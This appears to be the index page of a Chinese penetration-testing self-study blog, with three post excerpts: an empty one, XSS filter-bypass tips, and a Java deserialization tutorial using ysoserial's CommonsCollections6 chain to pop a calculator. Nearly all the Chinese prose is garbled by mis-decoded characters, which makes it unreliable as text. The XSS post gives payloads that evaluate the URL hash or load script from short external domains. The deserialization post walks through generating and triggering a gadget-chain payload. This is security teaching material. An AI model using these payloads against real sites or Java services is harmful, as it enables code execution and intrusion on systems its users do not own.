<!DOCTYPE html>
<html lang="cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-32x32.ico">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/favicon-32x32.ico" color="#222">
  <meta name="baidu-site-verification" content="http://data.zz.baidu.com/urls?site=https://blog.sechelper.com&token=CxiR0obbVQeqayMP">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"blog.sechelper.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"remove","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"changyan","storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="æŠ€æœ¯çƒ‚å¤§è¡—ï¼Œç»éªŒè¯šå¯è´µ">
<meta property="og:type" content="website">
<meta property="og:title" content="åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº">
<meta property="og:url" content="https://blog.sechelper.com/index.html">
<meta property="og:site_name" content="åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº">
<meta property="og:description" content="æŠ€æœ¯çƒ‚å¤§è¡—ï¼Œç»éªŒè¯šå¯è´µ">
<meta property="og:locale">
<meta property="article:author" content="ç‹—å¤´å›å¸ˆ">
<meta property="article:tag" content="åŠ©å®‰ç¤¾åŒº,æ¸—é€æµ‹è¯•,ä¿¡æ¯å®‰å…¨,ç½‘ç»œå®‰å…¨,å®‰å…¨å…¥é—¨,ä»£ç å®¡è®¡,åº”æ€¥å“åº”,webå®‰å…¨,ç³»ç»Ÿå®‰å…¨,æ¼æ´">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://blog.sechelper.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'cn'
  };
</script>

  <title>  - åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº </title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">å…³æ³¨å…¬ä¼—å·ã€åŠ©å®‰ç¤¾åŒºã€‘ï¼Œè®¢é˜…æœ€ä¼˜è´¨ç½‘ç»œå®‰å…¨å­¦ä¹ çŸ¥è¯†</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-ä¸»é¡µ">

    <a href="/" rel="section">ä¸»é¡µ</a>

  </li>
        <li class="menu-item menu-item-åŠ å…¥ç¤¾åŒº">

    <a href="/join-us/" rel="section">åŠ å…¥ç¤¾åŒº</a>

  </li>
        <li class="menu-item menu-item-å…³äº">

    <a href="/about/" rel="section">å…³äº</a>

  </li>
        <li class="menu-item menu-item-æ ‡ç­¾">

    <a href="/tags/" rel="section">æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-åˆ†ç±»">

    <a href="/categories/" rel="section">åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-å½’æ¡£">

    <a href="/archives/" rel="section">å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
   <style type="text/css">
  .qrcode-nav {
	bottom: 40%;
	box-sizing: border-box;
	color: #000;
	cursor: pointer;
	opacity: 1;
	padding: 0 6px;
	position: fixed;
	transition-property: bottom;
	z-index: 1300;
	width: initial;
	margin-left: 80%;
	high: 200;
	width: 200px;
}  
   </style>
  <div id="qrcode-nav" class="qrcode-nav">
  <center><img src="https://static.sechelper.com/img/qrcode/blog-kun.png"><span><strong>åŠ å…¥ç¤¾åŒº</strong></span></center>
  </div>
<script>
if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
document.getElementById("qrcode-nav").hidden=true
}
</script>

  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/penetration-testing-guide/sub-domains/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ç‹—å¤´å›å¸ˆ">
      <meta itemprop="description" content="æŠ€æœ¯çƒ‚å¤§è¡—ï¼Œç»éªŒè¯šå¯è´µ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/20230327/penetration-testing-guide/sub-domains/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>amss</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/penetration-testing-guide/xss-bypass/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ç‹—å¤´å›å¸ˆ">
      <meta itemprop="description" content="æŠ€æœ¯çƒ‚å¤§è¡—ï¼Œç»éªŒè¯šå¯è´µ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/20230327/penetration-testing-guide/xss-bypass/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ç»•è¿‡"><a class="header-anchor" href="#ç»•è¿‡">Â¶</a>ç»•è¿‡</h2>
<p>è§¦å‘xssæ—¶é‡åˆ°æœ‰é˜²å¾¡æªæ–½ç½‘ç«™æ—¶éœ€è¦åå¤è°ƒè¯•payloadï¼Œé‚£ä¹ˆå¤šè¯­æ³•è‚¯å®šä¸å¥½è®°ï¼Œä¸‹é¢ç»™å¤§å®¶å‡ ä¸ªç½‘ç«™ï¼Œé‡Œé¢åŒ…å«äº†å‡ ä¹æ‰€æœ‰xssè¯­å¥çš„å¤‡å¿˜å½•ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">burpsuiteå®˜æ–¹</a></li>
<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">owaspå®˜æ–¹</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/payloadbox/xss-payload-list">xss-payload-list</a></li>
</ul>
<p>**æ³¨æ„ï¼š*éƒ¨åˆ†payloadæ˜¯ä¾èµ–æµè§ˆå™¨ç‰ˆæœ¬çš„ï¼Œä¾‹å¦‚åœ¨<code>ç«ç‹æµè§ˆå™¨</code>è§¦å‘å¯èƒ½åœ¨<code>è°·æ­Œæµè§ˆå™¨</code>æœªå¿…å¯ä»¥ä½¿ç”¨ï¼Œburpsuiteå®˜æ–¹çš„å¤‡å¿˜å½•æœ‰æµ‹è¯•åŠŸèƒ½ï¼Œå¤§å®¶å¤šå°è¯•ä¸€ä¸‹ã€‚</p>
<p><strong>çªç ´HTMLå®ä½“ç¼–ç </strong></p>
<ul>
<li>å°–æ‹¬å·è¿‡æ»¤ç»•è¿‡ ğŸ‘‰ <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l8">å®éªŒ</a></li>
<li>å¼•å·ç»•è¿‡ ğŸ‘‰ <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l9">å®éªŒ</a></li>
<li>å¤§å°å†™ç»•è¿‡ ğŸ‘‰ <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l10">å®éªŒ</a></li>
<li>ç¼–ç å˜å½¢ç»•è¿‡ ğŸ‘‰ <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l11">å®éªŒ</a></li>
</ul>
<p><strong>çªç ´é•¿åº¦é™åˆ¶</strong></p>
<ul>
<li>
<p>ç²¾ç®€payloadğŸ‘‰ <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l11">å®éªŒ</a><br>
åœ¨urlä¸­ï¼Œ<code>#</code>åå†…å®¹ä¸ä¼šå‘é€ç»™æœåŠ¡å™¨ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¯ä»¥è¾¾åˆ°çªç ´é•¿åº¦é™åˆ¶å¹¶ä¸”éšè—æ”»å‡»åŒé‡ç›®çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=&quot;eval(location.hash.substr(1))&quot;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>çŸ­åŸŸåğŸ‘‰ <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l12">å®éªŒ</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//â…«.â‚¨&gt;</span><br><span class="line">&lt;script src=//â‘­.â‚¨&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>æ›´å¤šç»•è¿‡æŠ€å·§é›†åˆï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/244524.html</span><br><span class="line">https://zhuanlan.zhihu.com/p/93192936</span><br><span class="line">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</span><br><span class="line">https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html</span><br><span class="line">https://github.com/heroanswer/XSS_Cheat_Sheet_2020_Edition</span><br><span class="line">https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code</span><br><span class="line">https://medium.com/taptuit/minifying-xss-f17d7dc241cf</span><br><span class="line">https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss</span><br><span class="line">https://www.acunetix.com/websitesecurity/cross-site-scripting/</span><br></pre></td></tr></table></figure>
<p><strong>XSSç›²æ‰“å¹³å°</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xsshunter.com/</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/code-review/java-deserialization2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ç‹—å¤´å›å¸ˆ">
      <meta itemprop="description" content="æŠ€æœ¯çƒ‚å¤§è¡—ï¼Œç»éªŒè¯šå¯è´µ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="åŠ©å®‰ç¤¾åŒº - æåº¦å¼€æ”¾çš„ç½‘ç»œå®‰å…¨è‡ªå­¦ç¤¾åŒº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/20230327/code-review/java-deserialization2/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-27 09:44:43" itemprop="dateCreated datePublished" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>javaå®‰å…¨ ååºåˆ—åŒ–(äºŒ)</h1>
<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>å¯»æ‰¾ååºåˆ—åŒ–é“¾(Gadget)</p>
<ol>
<li>
<p>åœ¨é¡¹ç›®é‡Œæ‰¾æ¼æ´</p>
<p>readObjecté‡Œçš„æ¼æ´ä¸€èˆ¬æ¯”è¾ƒå°‘</p>
</li>
<li>
<p>å¯»æ‰¾é¡¹ç›®çš„ä¾èµ–åº“ç±»ä¸­çš„Gadget</p>
<p>ä¸€äº›ä¾èµ–ä¹Ÿä¼šæœ‰ååºåˆ—åŒ–çš„æ“ä½œï¼Œå¦‚æœjaråŒ…ä¸­çš„æŸäº›ç±»åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶æœ‰å¯æ§çš„ç‚¹ï¼Œå°±å¯ä»¥åˆ©ç”¨jaråŒ…ä¸­å­˜åœ¨çš„æ¼æ´æ¥æ„é€ è°ƒç”¨é“¾</p>
</li>
</ol>
<h2 id="ysoserialå·¥å…·"><a class="header-anchor" href="#ysoserialå·¥å…·">Â¶</a>ysoserialå·¥å…·</h2>
<p>ysoserialå·¥å…·å¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨ä¾èµ–åº“é‡Œé¢æ‰¾åˆ°åˆ©ç”¨é“¾ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/frohoff/ysoserial.git</span><br></pre></td></tr></table></figure>
<p>è¿›å…¥ysoserialç›®å½•ï¼Œç¼–è¯‘jaråŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
<p><img src="https://static.sechelper.com/img/2022/11/30/ace03ab928792a8918ed428060700e51.png" alt="image-20221128161645257"></p>
<p>å‡ºç°BUILD SUCCESSè¡¨ç¤ºç¼–è¯‘æˆåŠŸï¼Œåœ¨targetæ–‡ä»¶å¤¹ä¸‹</p>
<p>æ³¨æ„ï¼šè¦ä½¿ç”¨java 1.7+ çš„jdkç¯å¢ƒ</p>
<h2 id="æœ€ç»å…¸çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾"><a class="header-anchor" href="#æœ€ç»å…¸çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾">Â¶</a>æœ€ç»å…¸çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾</h2>
<p>Apache Commons Collections.jarä¸­çš„ä¸€æ¡popé“¾ï¼Œè¿™ä¸ªç±»åº“ä½¿ç”¨å¹¿æ³›ï¼Œæ‰€ä»¥å¾ˆå¤šå¤§å‹çš„åº”ç”¨ä¹Ÿå­˜åœ¨ç€è¿™ä¸ªæ¼æ´ã€‚</p>
<p>Commons Collections åœ¨3.x &lt; 3.2.2 ä»¥åŠ4.0è¿™äº›ç‰ˆæœ¬èŒƒå›´é‡Œï¼Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´</p>
<p>å½“ç›®æ ‡Javaåº”ç”¨ä¾èµ–åº“é‡ŒåŒ…å«å­˜åœ¨æ¼æ´çš„Commons Collectionsåº“ï¼Œä¸”å¯¹ç”±æ”»å‡»è€…å¯æ§çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå³ä¼šé€ æˆä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p>æˆ‘ä»¬ä»¥ysoserialé‡ŒCommonsCollections6è¿™ä¸ªpayloadä¸ºä¾‹ï¼Œè¿›è¡Œåˆ†æã€‚</p>
<p>å…ˆä½¿ç”¨ysoserialç”Ÿæˆååºåˆ—åŒ–çš„payload</p>
<p><img src="https://static.sechelper.com/img/2022/11/30/d586a438e2cecae4d372a693d6c9e453.png" alt="image-20221128161942308"></p>
<p>ä½¿ç”¨mavenå¯¼å…¥commons-collectionsä¾èµ–</p>
<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>åœ¨åˆ›å»ºæµ‹è¯•ä»£ç </p>
<p>TestCC6</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æŠŠç”Ÿæˆçš„cc6.seræ”¾åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ‰§è¡Œä»£ç ï¼Œå¼¹å‡ºè®¡ç®—æœº</p>
<p><img src="https://static.sechelper.com/img/2022/11/30/207f83919d1ac4061085f2bfa2c9cc16.png" alt="image-20221128172245115"></p>
<p>è¿è¡Œç¯å¢ƒä¸ºjava11</p>
<p>è¦è§£æcc6é“¾çš„ç»“æ„ä»£ç è¦å…ˆå­¦ä¹ ä¸‹javaåå°„ç›¸å…³ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¾ˆå¤šjavaæ¼æ´çš„POCä¸­çœ‹åˆ°åå°„çš„åˆ©ç”¨ï¼Œæ‰€ä»¥å­¦ä¹ javaå®‰å…¨æ˜¯ç»•ä¸å¼€åå°„çš„ã€‚</p>
<h2 id="javaåå°„"><a class="header-anchor" href="#javaåå°„">Â¶</a>javaåå°„</h2>
<p>Javaåå°„æœºåˆ¶æ˜¯åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•;å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„æ–¹æ³•å’Œå±æ€§(åŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•å’Œå±æ€§);è¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚</p>
<p>æ¶‰åŠåˆ°javaä¸­çš„å‡ ä¸ªç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Classç±»	ä»£è¡¨ç±»çš„å®ä½“ï¼Œåœ¨è¿è¡Œçš„javaåº”ç”¨ç¨‹åºä¸­è¡¨ç¤ºç±»å’Œæ¥å£</span><br><span class="line"></span><br><span class="line">Fieldç±»ï¼šä»£è¡¨ç±»çš„æˆå‘˜å˜é‡(æˆå‘˜å˜é‡ä¹Ÿç§°ä¸ºç±»çš„å±æ€§)</span><br><span class="line"></span><br><span class="line">Methodç±»ï¼šä»£è¡¨ç±»çš„æ–¹æ³•</span><br><span class="line"></span><br><span class="line">Constructorç±»ï¼šä»£è¡¨ç±»çš„æ„é€ æ–¹æ³•</span><br></pre></td></tr></table></figure>
<p>åœ¨Javaä¸­ä½ çœ‹åˆ°çš„ç»å¤§éƒ¨åˆ†æˆå‘˜ï¼Œå…¶å®éƒ½å¯ä»¥ç§°ä¹‹ä¸ºå¯¹è±¡ï¼ˆé™¤äº†æ™®é€šæ•°æ®ç±»å‹å’Œé™æ€æˆå‘˜)ã€‚</p>
<p>ç±»ä¹Ÿæ˜¯å¯¹è±¡ï¼Œç±»æ˜¯java.lang.Classç±»çš„å®ä¾‹å¯¹è±¡</p>
<p>Classç±»æŠ½è±¡å‡ºäº†javaä¸­ç±»çš„ç‰¹å¾å¹¶æä¾›äº†ä¸€äº›æ–¹æ³•</p>
<p>æœ‰ä¸‰ç§æ–¹å¼è·å¾—Classç±»å®ä¾‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>å¦‚æœçŸ¥é“classçš„å®Œæ•´ç±»åï¼Œå¯ä»¥è°ƒç”¨Classç±»çš„é™æ€æ–¹æ³•Class.forNameè·å–</span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.dong.User&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>ä»»ä½•ä¸€ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªéšå«çš„é™æ€æˆå‘˜classï¼Œè¿™ä¸ªå±æ€§å°±å­˜å‚¨ç€è¿™ä¸ªç±»å¯¹åº”çš„Classç±»çš„å®ä¾‹ï¼š</span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> com.dong.User.class;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„getClass()æ–¹æ³•ï¼š</span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">User</span>()).getClass();</span><br></pre></td></tr></table></figure>
<h3 id="æµ‹è¯•è·å–ï¼Œè°ƒç”¨æ–¹æ³•"><a class="header-anchor" href="#æµ‹è¯•è·å–ï¼Œè°ƒç”¨æ–¹æ³•">Â¶</a>æµ‹è¯•è·å–ï¼Œè°ƒç”¨æ–¹æ³•</h3>
<p>User</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(String name)</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Helloï¼š&quot;</span>+name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4 id="è·å–æ–¹æ³•ï¼š"><a class="header-anchor" href="#è·å–æ–¹æ³•ï¼š">Â¶</a>è·å–æ–¹æ³•ï¼š</h4>
<p>æˆ‘ä»¬ä¹‹å‰å·²ç»æåˆ°äº†Methodè¿™ä¸ªç±»ï¼Œjavaä¸­æ‰€æœ‰çš„æ–¹æ³•éƒ½æ˜¯Methodç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡åå°„æœºåˆ¶è·å–åˆ°æŸä¸ªå¯¹è±¡çš„æ–¹æ³•ä¹Ÿæ˜¯Methodç±»å‹çš„ã€‚é€šè¿‡Classå¯¹è±¡è·å–æŸä¸ªæ–¹æ³•ï¼š</p>
<p>æ–¹æ³•çš„åç§°å’Œæ–¹æ³•çš„å‚æ•°åˆ—è¡¨ï¼Œä¸¤è€…ä¿¡æ¯æ‰èƒ½ç¡®å®šæŸä¸€ä¸ªæ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clz.getMethod(æ–¹æ³•åï¼Œè¿™ä¸ªæ–¹æ³•çš„å‚æ•°ç±»å‹)</span><br></pre></td></tr></table></figure>
<h4 id="è°ƒç”¨æ–¹æ³•ï¼š"><a class="header-anchor" href="#è°ƒç”¨æ–¹æ³•ï¼š">Â¶</a>è°ƒç”¨æ–¹æ³•ï¼š</h4>
